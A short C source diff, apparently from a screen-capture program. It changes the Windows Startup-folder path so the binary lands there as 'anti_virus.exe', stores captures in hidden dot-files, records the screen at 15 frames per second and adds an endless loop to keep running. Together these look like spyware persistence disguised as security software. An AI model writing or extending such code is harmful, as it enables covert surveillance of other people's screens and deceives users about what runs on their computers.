@@ -4,7 +4,16 @@
 const char *output_dir = ".output_screen";
 const char *output_file = ".output_text.txt";
 
-const char *window_start_path = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+const char *window_start_path = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\anti_virus.exe";
+
+#ifdef _WIN32
+    #include <windows.h>  // Pour Sleep sous Windows
+    #define SLEEP(ms) Sleep(ms)
+#else
+    #include <unistd.h>   // Pour sleep sous Linux/macOS
+    #define SLEEP(ms) usleep((ms) * 1000)
+#endif
+
 
 #ifdef __linux__
 
@@ -94,6 +103,9 @@ int main(int argc, char *argv[]) {
         else {
             capture_screen_at_fps(15, output_dir);
         }
+    }
+    while (1){
+        SLEEP(intervalle * 1000);
     }
 
     return 0;
